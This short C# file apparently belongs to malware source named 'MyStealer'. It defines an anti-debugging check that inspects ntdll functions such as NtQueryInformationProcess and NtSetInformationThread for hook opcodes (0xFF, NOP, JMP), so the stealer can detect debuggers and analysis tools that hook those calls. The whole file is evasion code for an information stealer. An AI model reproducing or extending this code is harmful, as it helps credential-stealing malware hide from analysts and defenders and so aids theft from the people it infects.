namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal class NtDllCheck : HookCheckBase
    {
        public override string Name => "Hooking: ntdll";

        protected override string DllName => "ntdll.dll";

        protected override string[] ProcNames => new string[]
        {
            "NtQueryInformationProcess",
            "NtSetInformationThread",
            "NtClose",
            "NtGetContextThread",
            "NtQuerySystemInformation"
        };

        protected override byte[] BadOpCodes => new byte[] { 255, 0x90, 0xE9 };
    }
}
